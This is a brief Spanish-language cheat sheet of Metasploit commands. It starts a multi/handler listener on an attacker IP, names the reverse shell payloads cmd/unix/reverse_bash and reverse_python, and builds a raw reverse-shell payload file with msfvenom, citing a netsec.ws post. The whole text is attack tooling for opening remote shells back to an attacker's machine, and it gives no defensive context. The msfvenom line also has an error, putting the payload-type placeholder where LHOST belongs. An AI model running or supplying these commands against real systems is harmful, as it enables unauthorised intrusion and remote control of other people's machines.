--Comando para el handler segun el payload elegido:

# msfcli exploit/multi/handler PAYLOAD=<Tipo de Payload> LHOST=<IP Atacante> E

--Tipos de payload:
	--> cmd/unix/reverse_bash
	--> cmd/unix/reverse_python

	--> # msfvenom -l

--Comando para el payload

# msfvenom -p <Tipo de Payload> LHOST=<Tipo de Payload> LPORT=<Puerto A Conectarse> -f raw > shell.py

--Referencia:

~http://netsec.ws/?p=331
